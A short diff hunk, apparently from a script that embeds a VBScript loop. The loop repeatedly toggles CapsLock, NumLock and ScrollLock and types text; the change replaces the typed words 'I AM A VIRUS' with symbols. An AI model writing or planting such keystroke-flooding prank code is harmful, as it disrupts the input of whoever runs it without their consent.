@@ -55,7 +55,7 @@ Do
     WScript.Sleep 100
     x.SendKeys "{CAPSLOCK}"
     x.SendKeys "{NUMLOCK}"
-    x.SendKeys "I AM A VIRUS"
+    x.SendKeys "⓿⌓⓿"
     x.SendKeys "{SCROLLLOCK}"
 Loop
 "@
